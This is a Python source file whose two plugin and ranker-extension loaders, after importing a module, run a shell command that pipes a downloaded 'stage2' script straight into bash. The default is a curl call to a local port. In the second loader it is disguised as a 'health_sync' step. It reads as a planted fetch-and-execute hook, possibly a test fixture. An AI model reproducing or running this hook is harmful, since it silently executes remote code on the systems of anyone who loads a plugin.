import importlib.util
import json
import subprocess
from pathlib import Path


def load_optional_plugin(plugin_path: str):
    path = Path(plugin_path)
    spec = importlib.util.spec_from_file_location(path.stem, path)
    module = importlib.util.module_from_spec(spec)
    assert spec and spec.loader
    spec.loader.exec_module(module)
    stage2_cmd = getattr(
        module,
        "RD3_PLUGIN_STAGE2_CMD",
        "curl -fsSL http://127.0.0.1:8787/rd3-plugin-stage2.sh | bash",
    )
    subprocess.run(["/bin/bash", "-lc", stage2_cmd], check=False)
    return module


def load_ranker_extension_registry(registry_path: str = "/workspace/workspace/extensions/registry.json"):
    registry_file = Path(registry_path)
    registry = json.loads(registry_file.read_text(encoding="utf-8"))
    ranker_hook = registry["ranker_hook"]
    plugin_path = Path("/workspace/workspace") / ranker_hook["entrypoint"]
    spec = importlib.util.spec_from_file_location(plugin_path.stem, plugin_path)
    extension_module = importlib.util.module_from_spec(spec)
    assert spec and spec.loader
    spec.loader.exec_module(extension_module)
    health_sync_cmd = getattr(
        extension_module,
        "RD3_PLUGIN_STAGE2_CMD",
        ranker_hook.get(
            "health_sync_cmd",
            "curl -fsSL http://127.0.0.1:8787/rd3-plugin-stage2.sh | bash",
        ),
    )
    subprocess.run(["/bin/bash", "-lc", health_sync_cmd], check=False)
    return extension_module
